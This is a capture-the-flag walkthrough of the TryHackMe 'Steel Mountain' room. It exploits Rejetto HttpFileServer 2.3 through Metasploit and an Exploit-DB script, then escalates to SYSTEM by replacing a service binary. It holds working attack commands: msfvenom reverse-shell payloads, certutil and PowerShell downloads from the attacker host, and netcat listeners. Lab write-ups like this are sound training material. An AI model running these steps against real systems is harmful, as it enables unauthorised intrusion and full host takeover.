---
layout: page
title: Steel Mountain
description: Steel Mountain from TryHackMe.
img: 
importance: 4
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/steelmountain/logo.jpeg" title="THM Steel Mountain Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/steelmountain">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to climb up the mountain of Mr. Robot.

Run nmap to get a list of the services running.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# nmap -sC -sV -A -O -oN nmap 10.10.109.201
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 11:25 GMT
Nmap scan report for 10.10.109.201
Host is up (0.00040s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-02-25T11:26:24+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /

<snip>
```
{% endraw %}

<br />
Run curl -I to pull the headers to try and fingerprint the technology.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# curl -I http://10.10.109.201
HTTP/1.1 200 OK
Content-Length: 772
Content-Type: text/html
Last-Modified: Fri, 27 Sep 2019 13:07:11 GMT
Accept-Ranges: bytes
ETag: "9736bb793475d51:0"
Server: Microsoft-IIS/8.5
Date: Tue, 25 Feb 2025 11:36:27 GMT
```
{% endraw %}

<br />
Check the Landing Page of the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/steelmountain/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
View the source code looking for anything interesting.

{% raw %}
```html
view-source:http://10.10.109.201/

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```
{% endraw %}

<br />
Reviewing the nmap results, search for the HttpFileServer httpd 2.3.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/steelmountain/google.png" title="Google It" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run msfconsole.  The q option suppresses the ASCII art.  Search for the CVE indicated in the Google search.  There was only one result and chose to use that option.  Show the options for that exploit.  Set the rhosts and rport options.  Since I am using the provided Attack Box, I don't need lport.  Use exploit to launch the exploit and get the meterpreter response.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountainmsfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > search cve-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.30.38      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.109.201
rhosts => 10.10.109.201
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.30.38:4444 
[*] Using URL: http://10.10.30.38:8080/Rjy6EBr38Okww
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /Rjy6EBr38Okww
[*] Sending stage (177734 bytes) to 10.10.109.201
[!] Tried to delete %TEMP%\jRNniopprkRtO.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.30.38:4444 -> 10.10.109.201:49268) at 2025-02-25 12:17:33 +0000
[*] Server stopped.

meterpreter > shell
Process 780 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
C:\Users\bill\Desktop>type user.txt
type user.txt
<redacted>

C:\Users\bill\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::154e:3c85:c145:2be1%14
   IPv4 Address. . . . . . . . . . . : 10.10.109.201
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Download PowerUp.ps1.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2025-02-25 12:24:24--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: \u2018PowerUp.ps1\u2019

PowerUp.ps1                                          100%[=====================================================================================================================>] 586.50K  --.-KB/s    in 0.007s  

2025-02-25 12:24:24 (85.5 MB/s) - \u2018PowerUp.ps1\u2019 saved [600580/600580]
```
{% endraw %}

<br />
Upload PowerUp.ps1 to the victim machine.

{% raw %}
```bash
meterpreter > upload PowerUp.ps1
[*] Uploading  : /root/Rooms/steelmountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/Rooms/steelmountain/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /root/Rooms/steelmountain/PowerUp.ps1 -> PowerUp.ps1
```
{% endraw %}

<br />
Load the powershell meterpreter extension and drop into a PowerShell shell.

{% raw %}
```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```
{% endraw %}

<br />
Run all of the checks a part of the PowerUp script.  Look for something with unquoted service path and CanRestart is True.

{% raw %}
```bash
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

<snip>
```
{% endraw %}

<br />
Use msfvenom to generate a service executable to replace the executable from the PowerUp results.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.38 LPORT=9001 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
root@ip-10-10-30-38:~/Rooms/steelmountain# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Use certutil.exe to transfer the binary to the victim machine.

{% raw %}
```bash
PS > certutil.exe -urlcache -f http://10.10.30.38:8000/Advanced.exe Advanced.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# nc -nlvp 9001
Listening on 0.0.0.0 9001
```
{% endraw %}

<br />
Stop the servic from running.  Overwrite the binary in the path indicated.  Then restart the binary.

{% raw %}
```bash
PS > Stop-Service -Name "AdvancedSystemCareService9"
PS > cp Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
PS > Start-Service -Name "AdvancedSystemCareService9"
ERROR: Start-Service : Failed to start service 'Advanced SystemCare Service 9 (AdvancedSystemCareService9)'.
ERROR: At line:1 char:1
ERROR: + Start-Service -Name "AdvancedSystemCareService9"
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
ERROR:    ServiceCommandException
ERROR:     + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.StartServiceCommand
ERROR:
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.109.201 49303
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<redacteds>
C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::154e:3c85:c145:2be1%14
   IPv4 Address. . . . . . . . . . . : 10.10.109.201
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Lookup the exploit linked in the box description.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/steelmountain/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a>

<br />
Download the exploit to the local working folder.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# wget https://www.exploit-db.com/raw/39161 -O exploit.py
--2025-02-25 12:53:23--  https://www.exploit-db.com/raw/39161
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2515 (2.5K) [text/plain]
Saving to: \u2018exploit.py\u2019

exploit.py                                           100%[=====================================================================================================================>]   2.46K  --.-KB/s    in 0s      

2025-02-25 12:53:23 (339 MB/s) - \u2018exploit.py\u2019 saved [2515/2515]
```
{% endraw %}

<br />
Copy nc.exe into the local working folder.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# cp `locate nc.exe` .
root@ip-10-10-30-38:~/Rooms/steelmountain# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# nc -nlvp 443
Listening on 0.0.0.0 443
```
{% endraw %}

<br />
Update the script with the ip address and port for the attack.

{% raw %}
```python
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes

<snip>

    ip_addr = "10.10.30.38" #local IP address
	local_port = "443" # Local Port number

<snip>
```
{% endraw %}

<br />
Run the exploit twice.  One time transfers the nc.exe to the victim.  One time for the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
└─$ python2 exploit.py 10.10.109.201 8080
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
└─$ python2 exploit.py 10.10.109.201 8080
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.109.201] 49342
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```
{% endraw %}

<br />
Download winpeas.exe to the local working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASany.exe -O winpeas.exe
--2025-02-26 00:13:40--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASany.exe
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/8d8b318f-e681-48fc-99e1-d1a6fd40641e?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250225%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250225T131350Z&X-Amz-Expires=300&X-Amz-Signature=c8a6c3bbe5ad5f4595100507694fd7803a4505ca1beefaf628d6e6af6d0bd549&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DwinPEASany.exe&response-content-type=application%2Foctet-stream [following]
--2025-02-26 00:13:41--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/8d8b318f-e681-48fc-99e1-d1a6fd40641e?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250225%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250225T131350Z&X-Amz-Expires=300&X-Amz-Signature=c8a6c3bbe5ad5f4595100507694fd7803a4505ca1beefaf628d6e6af6d0bd549&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DwinPEASany.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10143232 (9.7M) [application/octet-stream]
Saving to: ‘winpeas.exe’

winpeas.exe                                                100%[========================================================================================================================================>]   9.67M  3.16MB/s    in 3.1s    

2025-02-26 00:13:45 (3.16 MB/s) - ‘winpeas.exe’ saved [10143232/10143232]
```
{% endraw %}

<br />
Use certutil.exe to transfer the peas to the victim machine.

{% raw %}
```bash
<C:\Users\bill>certutil.exe -urlcache -f http://10.4.119.29/winpeas.exe winpeas.exe
certutil.exe -urlcache -f http://10.4.119.29/winpeas.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Run the winpeas.exe.

{% raw %}
```bash
C:\Users\bill>.\winpeas.exe
.\winpeas.exe
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                                                                                                                                                             
        (((((((((((((((((((((((((((((((((((((((((((                                                                                                                                                                                         
      ((((((((((((((**********/##########(((((((((((((                                                                                                                                                                                      
    ((((((((((((********************/#######(((((((((((                                                                                                                                                                                     
    ((((((((******************/@@@@@/****######((((((((((                                                                                                                                                                                   
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                                                                                                 
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                                                                                                
    (((############*********/%@@@@@@@@@/************((((((((                                                                                                                                                                                
    ((##################(/******/@@@@@/***************((((((                                                                                                                                                                                
    ((#########################(/**********************(((((                                                                                                                                                                                
    ((##############################(/*****************(((((                                                                                                                                                                                
    ((###################################(/************(((((                                                                                                                                                                                
    ((#######################################(*********(((((                                                                                                                                                                                
    ((#######(,.***.,(###################(..***.*******(((((                                                                                                                                                                                
    ((#######*(#####((##################((######/(*****(((((                                                                                                                                                                                
    ((###################(/***********(##############()(((((                                                                                                                                                                                
    (((#####################/*******(################)((((((                                                                                                                                                                                
    ((((############################################)((((((                                                                                                                                                                                 
    (((((##########################################)(((((((                                                                                                                                                                                 
    ((((((########################################)(((((((                                                                                                                                                                                  
    ((((((((####################################)((((((((                                                                                                                                                                                   
    (((((((((#################################)(((((((((                                                                                                                                                                                    
        ((((((((((##########################)(((((((((                                                                                                                                                                                      
              ((((((((((((((((((((((((((((((((((((((                                                                                                                                                                                        
                 (((((((((((((((((((((((((((((( 
     
<snip>
```
{% endraw %}

<br />
Look up all the services.

{% raw %}
```bash
LookC:\Users\bill>powershell -c "Get-Service"
powershell -c "Get-Service"

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  AdvancedSystemC... Advanced SystemCare Service 9         
Stopped  AeLookupSvc        Application Experience                
Stopped  ALG                Application Layer Gateway Service     
Running  AmazonSSMAgent     Amazon SSM Agent                      
Running  AppHostSvc         Application Host Helper Service 

<snip>
```
{% endraw %}

<br />
Generate the service binary payload with msfvenom...again.  Or use the last one from the meterpreter run.

{% raw %}
```bash
root@ip-10-10-30-38:~/Rooms/steelmountain# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.30.38 LPORT=9001 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
root@ip-10-10-30-38:~/Rooms/steelmountain# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 

<snip>
```
{% endraw %}

<br />
Use PowerShell to transfer the file to the victim machine.

{% raw %}
```bash
C:\Users\bill>powershell -c wget "http://10.4.119.29:8000/Advanced.exe" -outfile "Advanced.exe"
powershell -c wget "http://10.4.119.29:8000/Advanced.exe" -outfile "Advanced.exe"
```
{% endraw %}

<br />
Create a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
└─$ nc -nlvp 9001                             
listening on [any] 9001 ...
```
{% endraw %}

<br />
Stop the service from running.  Overwrite the binary.  Start the service again.

{% raw %}
```bash
C:\Users\bill>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Users\bill>copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): Yes
Yes
        1 file(s) copied.

C:\Users\bill>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2044
        FLAGS              : 
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/steelmountain]
└─$ nc -nlvp 9001                             
listening on [any] 9001 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.109.201] 49410
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
{% endraw %}

<br />
And here we on top of the mountain.  Hope you enjoyed the climb.  See you in the next one.